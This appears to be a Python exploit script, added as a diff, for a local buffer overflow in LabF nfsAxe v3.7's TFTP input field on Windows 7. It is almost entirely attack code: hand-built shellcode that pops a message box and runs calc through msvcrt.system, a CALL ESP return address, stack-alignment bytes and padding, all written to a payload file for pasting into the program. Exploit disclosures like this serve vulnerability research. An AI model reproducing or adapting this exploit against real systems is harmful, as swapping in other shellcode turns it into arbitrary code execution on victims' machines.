@@ -1,0 +1,70 @@
+#!/usr/bin/python
+########################################################################################################
+# Exploit Author: Miguel Mendez Z
+# Exploit Title: LabF nfsAxe v3.7 - TFTP "Input Directory" Local Buffer Overflow 
+# Date: 29-01-2018
+# Software: LabF nfsAxe
+# Version: v3.7
+# Vendor Homepage: http://www.labf.com
+# Software Link: http://www.labf.com/download/nfsaxe.exe
+# Tested on: Windows 7 x86
+########################################################################################################
+
+import struct
+
+ropAlignEsp = (
+"\x83\xEC\x58" #SUB ESP,58
+"\x83\xEC\x58"  #SUB ESP,58
+"\x83\xEC\x58"  #SUB ESP,58
+"\x83\xEC\x58"  #SUB ESP,58
+"\x83\xEC\x10"  #SUB ESP,10
+"\xFF\xE4"      #JMP ESP
+)
+
+scode  = "\xB9\xEF\xEE\xEE\xEE"     #MOV ECX,EEEEEEEF
+scode += "\x81\xC1\x11\x11\x11\x11" #ADD ECX,11111111
+scode += "\x51"                     #PUSH ECX
+scode += "\x68\x31\x30\x73\x21"     #PUSH 31307321
+scode += "\x68\x73\x31\x6b\x72"     #PUSH 73316b72
+scode += "\x68\x5f\x62\x79\x5f"     #PUSH 5f62795f
+scode += "\x68\x70\x77\x6e\x64"     #PUSH 70776e64
+scode += "\x68\x42\x30\x66\x5f"     #PUSH 4230665f
+scode += "\x8B\xD4"                 #MOV EDX,ESP
+scode += "\x48"                     #DEC EAX
+scode += "\x50"                     #PUSH EAX
+scode += "\x52"                     #PUSH EDX
+scode += "\x52"                     #PUSH EDX
+scode += "\x50"                     #PUSH EAX
+scode += "\xBA\x11\xEA\x1A\x76"     #MOV EDX,USER32.MessageBoxA() (Change)
+scode += "\xFF\xD2"                 #CALL EDX
+#--------------
+scode += "\x33\xD2"                 #XOR EDX,EDX
+scode += "\xB9\xEF\xEE\xEE\xEE"     #MOV ECX,EEEEEEEF
+scode += "\x81\xC1\x11\x11\x11\x11" #ADD ECX,11111111
+scode += "\x51"                     #PUSH ECX
+scode += "\x68\x63\x61\x6c\x63"     #PUSH 0x63616c63
+scode += "\x8B\xD4"                 #MOV EDX,ESP
+scode += "\x52"                     #PUSH EDX
+scode += "\x33\xD2"                 #XOR EDX,EDX
+scode += "\xBA\x6F\xB1\x0F\x76"     #MOV EDX,msvcrt.system - 0x760fb16f (Change)
+scode += "\xFF\xD2"                 #CALL EDX
+#--------------
+scode += "\x50"                     #PUSH EAX
+scode += "\xB8\xE2\xBB\xB5\x75"     #MOV EAX,kernel32.ExitProcess() (Change)
+scode += "\xFF\xD0"                 #CALL EAX
+
+offset  = "Host: "+scode+"A"*(1000-len(scode))+"\n"
+offset += "File(s): "+"B"*33
+offset += struct.pack("<L",0x75A6923D) #CALL ESP ADVAPI32.DLL 
+offset += "B"*5
+offset += ropAlignEsp
+offset += "B"*(1037-37+(len(ropAlignEsp)-5))+"\n"
+offset += "Remote Dir y Local Dir: "+"C"*1000
+
+payload = offset
+print "Payload len: "+str(len(payload))
+print "Shellcode len: "+str(len(scode))
+
+file=open('tftpPoc.txt','w')
+file.write(payload)
+file.close()
